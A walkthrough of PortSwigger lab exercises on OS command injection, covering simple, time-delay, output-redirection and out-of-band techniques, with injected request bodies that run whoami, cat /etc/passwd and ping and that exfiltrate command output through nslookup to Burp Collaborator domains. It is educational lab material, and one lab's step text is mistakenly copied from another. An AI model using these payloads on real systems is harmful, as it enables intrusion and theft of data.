# Portswigger
## Command Injection
### OS command injection, simple case
```bash

Click on "View details"

Intercept is on

Click on the "Check stock" button

Send to repeater

productId=1&storeId=2|whoami

productId=1&storeId=2|cat+/etc/passwd

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220502225806.png)
![image](https://0xc0rvu5.github.io/docs/assets/images/20220502230020.png)

### Blind OS command injection with time delays
```bash

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "Submit Feedback"

Send to repeater

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message

Systematically enter "||" following each of the responses. If the response returns an error it may be exploitable

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name||&email=email%40email.com&subject=subject&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||&subject=subject&message=message

HTTP/1.1 500 Internal Server Error

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject||&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message||

HTTP/1.1 200 OK

Insert "||ping+-c+10+127.0.0.1||" following the email parameter response to ping the local host for 10 seconds. If the delay occurs then command injection is possible

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||ping+-c+10+127.0.0.1||&subject=subject&message=message

```


![image](https://0xc0rvu5.github.io/docs/assets/images/20220503230007.png)
![image](https://0xc0rvu5.github.io/docs/assets/images/20220503230050.png)

### Blind OS command injection with output redirection
```bash

writeable folder @ /var/www/images/ in the lab example below

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "Submit Feedback" & enter arguments accordingly

Send to repeater

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message

Systematically enter "||" following each of the responses. If the response returns an error it may be exploitable

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name||&email=email%40email.com&subject=subject&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||&subject=subject&message=message

HTTP/1.1 500 Internal Server Error

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject||&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message||

HTTP/1.1 200 OK

Insert "||whoami+>+/var/www/images/whoami.txt||" following the email parameter response to ping the local host for 10 seconds. If the delay occurs then command injection is possible

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||whoami+>+/var/www/images/whoami.txt||&subject=subject&message=message

HTTP/1.1 200 OK

Go to "Home"
Turn intercept on
Click "View details"
Forward the proxy twice until you see:

GET /image?filename=66.jpg HTTP/1.1

Send to repeater
Change filename to "whoami.txt"

GET /image?filename=whoami.txt HTTP/1.1

```

### Blind OS command injection with out-of-band interaction
```bash

Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "Submit Feedback" & enter arguments accordingly

Send to repeater

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message

Systematically enter "||" following each of the responses. If the response returns an error it may be exploitable

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name||&email=email%40email.com&subject=subject&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||&subject=subject&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject||&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message||

HTTP/1.1 200 OK

As stated at the beginning of the lab any input will not have any effect on the application's response. Normally fuzzing each individual parameter would occur. 
Burp -> Burp collaborator client > Copy to clipboard

Here we are going to use "nslookup" to query the domain server from internally within the exploitable server.
Insert "nslookup" followed by "x979exvy4m3qvxi7njop5sq8uz0poe.burpcollaborator.net" to catch the DNS query response.
Ensure oastify.com is switched to burpcollaborator.net for lab purposes.
Insert "||nslookup+x979exvy4m3qvxi7njop5sq8uz0poe.burpcollaborator.net||" following the email argument

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||nslookup+x979exvy4m3qvxi7njop5sq8uz0poe.burpcollaborator.net||&subject=subject&message=message

Go to Burp Collaborator client and click "Poll now"
The DNS queries should be visible

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220504000148.png)

### Blind OS command injection with out-of-band data exfiltration
```bash

feedback function is the target
Go To: Proxy
Options
Enable "Intercept responses based on the following rules: Master interception is turned off"
Intercept is on
Click on "Submit Feedback" & enter arguments accordingly

Send to repeater

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message

Systematically enter "||" following each of the responses. If the response returns an error it may be exploitable

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name||&email=email%40email.com&subject=subject&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com||&subject=subject&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject||&message=message

HTTP/1.1 200 OK

csrf=qa3MofHur2Aeq5Jk4Rjq103VLxDPRvGc&name=name&email=email%40email.com&subject=subject&message=message||

HTTP/1.1 200 OK

As stated at the beginning of the lab any input will not have any effect on the application's response. Normally fuzzing each individual parameter would occur. 
Burp -> Burp collaborator client > Copy to clipboard

Here we are going to use "nslookup" to query the domain server from internally within the exploitable server.
Insert "nslookup" followed by "x979exvy4m3qvxi7njop5sq8uz0poe.burpcollaborator.net" to catch the DNS query response.
Ensure oastify.com is switched to burpcollaborator.net for lab purposes.
Insert "||nslookup+`whoami`.edvww8p3mxezczqzcipuw2ccn3tthi.burpcollaborator.net||" following the email argument

||nslookup+`whoami`.edvww8p3mxezczqzcipuw2ccn3tthi.burpcollaborator.net||

csrf=s0Xt4LAYi9Bnis7fXLg8CfJ4JWa651yj&name=name&email=email%40email.com||nslookup+`whoami`.edvww8p3mxezczqzcipuw2ccn3tthi.burpcollaborator.net||&subject=subject&message=message

Go to Burp Collaborator client and click "Poll now"
The DNS queries should be visible
The subdomain of the domain name will be the output of the "whoami" command

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220504154759.png)

#hacking
